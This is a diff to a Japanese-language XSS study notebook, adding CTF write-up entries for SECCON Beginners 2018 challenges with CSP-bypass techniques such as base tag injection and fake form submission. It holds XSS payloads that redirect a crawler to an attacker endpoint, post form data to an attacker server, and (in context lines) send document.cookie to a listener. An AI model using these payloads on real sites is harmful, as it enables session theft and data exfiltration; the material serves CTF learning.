@@ -109,8 +109,10 @@ document.getElementById("aaa").innerHTML = "<img src=/ onerror=alert(1)>"
 ```txt
 <base href="http://hoge.example">
 ```
-CSPが設定されている場合は以下で検知できる。   
+CSPが設定されている場合は以下で検知できるかも(script-srcがあれば)。   
 https://csp-evaluator.withgoogle.com/   
+CSPが`default-src 'none'`だとしてもformの送信先も変えられる！！！！！   
+
 ## DOM clobbering
 タグに同じid名を付与すれば、もともと`<div id="a">`に`document.getElementById("a").innerHTML`で代入していても、`<script id="a">`を挿入することでこっちにJavascriptを要素の値として挿入して実行できる！   
 - 参考   
@@ -417,14 +419,50 @@ document.location=`http://192.168.99.1:4444/?q=${encodeURIComponent(document.coo
 https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic   
 http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info#23-   
 
-## 
+## Reflected (SECCON beginners 2018 Gimme your comment)
+https://graneed.hatenablog.com/entry/2018/05/27/165740   
+https://tech.kusuwada.com/entry/2018/05/31/011755   
 - **entrypoint**   
+`新規投稿`ボタンを押して入力する`タイトル`と`本文`のうち、本文にXSSの脆弱性があるらしい。   
+User-Agentにフラグがあるらしい。   
+どうやら投稿ページにだけクローラが動いていて、ユーザーが何らかのデータを送信すると、そのクローラも同じくその値を使って投稿ページにアクセスするっぽい？？(そうじゃないとサーバーのUser-Agentゲットできないし…)   
 - **概要**   
+https://tech.kusuwada.com/entry/2018/05/31/011755   
+にある通り、以下のBeeceptorというツールでグローバルなエンドポイントを簡単に作成できるらしい。   
+https://beeceptor.com/   
 - **Payload**   
-## 
+以下を送信してUser-Agentを得る。   
+```txt
+<script>location.href="http://<myserver>/1g993rc1"</script>
+```
+## Reflect / BaseTag Injection / force scraping fake Form (SECCON beginners 2018 Gimme your comment REVENGE)
+https://graneed.hatenablog.com/entry/2018/05/27/170036   
+https://tech.kusuwada.com/entry/2018/05/31/011755   
+
 - **entrypoint**   
+上記と同じ個所にXSSの脆弱性があるが、今度はCSPが`Content-Security-Policy: default-src 'self'`となっており、同一オリジン内からしか読み込めないようになっている。   
 - **概要**   
+相対URLで書かれているのでBase Tag Injectionが可能！！！   
+また、クローラが以下のようにしてフォームが送信されたかどうかを確認して同様の操作を再現しているが、フォームなら何でも良さそうなので攻撃者サーバーに送信する偽のフォームをセットすれば、そのフォームからの送信を再現して、攻撃者サーバーにアクセスしてくれる！   
+```txt
+await page.click('button[type=submit]');
+```
+```html
+<form method="post" action="http://{作成したエンドポイント}">
+  <input type="text" name="dummy_form">
+  <button type="submit">ダミーボタンだよ</button>
+</form>
+```
 - **Payload**   
+```html
+<base href = "http://myserver/" />
+```
+```html
+<form method="post" action="http://{作成したエンドポイント}">
+  <input type="text" name="dummy_form">
+  <button type="submit">ダミーボタンだよ</button>
+</form>
+```
 ## 
 - **entrypoint**   
 - **概要**   
